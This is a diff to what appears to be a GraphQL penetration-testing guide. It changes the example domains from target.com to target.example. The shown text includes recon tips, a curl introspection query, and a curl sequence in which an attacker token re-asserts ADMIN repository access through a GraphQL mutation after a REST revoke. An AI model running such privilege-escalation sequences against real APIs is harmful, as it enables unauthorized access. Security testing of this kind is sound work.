@@ -61,7 +61,7 @@ X-Request-Id + no REST-style path params = likely GraphQL
 - `__schema` or `__type` in any response = confirmed GraphQL
 
 **Recon Sources:**
-- `github.com` search: `"graphql" site:target.com`
+- `github.com` search: `"graphql" site:target.example`
 - Wayback Machine for `/graphql` paths
 - JS bundle scanning with `LinkFinder` or `getallurls`
 
@@ -127,7 +127,7 @@ X-Request-Id + no REST-style path params = likely GraphQL
 
 **curl introspection test:**
 ```bash
-curl -s -X POST https://target.com/graphql \
+curl -s -X POST https://target.example/graphql \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer YOUR_TOKEN" \
   -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
@@ -167,21 +167,21 @@ A single GraphQL request aliases the same mutation with different OTP codes. Com
 **RC desync test pattern (pseudo-sequence):**
 ```bash
 # Step 1: Grant access via REST
-curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
+curl -X PUT https://api.target.example/repos/ORG/REPO/teams/TEAM \
   -H "Authorization: token ADMIN_TOKEN" \
   -d '{"permission":"admin"}'
 
 # Step 2: Revoke via REST  
-curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
+curl -X DELETE https://api.target.example/repos/ORG/REPO/teams/TEAM \
   -H "Authorization: token ADMIN_TOKEN"
 
 # Step 3: Re-assert via GraphQL mutation
-curl -X POST https://api.target.com/graphql \
+curl -X POST https://api.target.example/graphql \
   -H "Authorization: bearer ATTACKER_TOKEN" \
   -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'
 
 # Step 4: Verify persistent access
-curl https://api.target.com/repos/ORG/REPO/teams \
+curl https://api.target.example/repos/ORG/REPO/teams \
   -H "Authorization: token ADMIN_TOKEN"
 ```
 
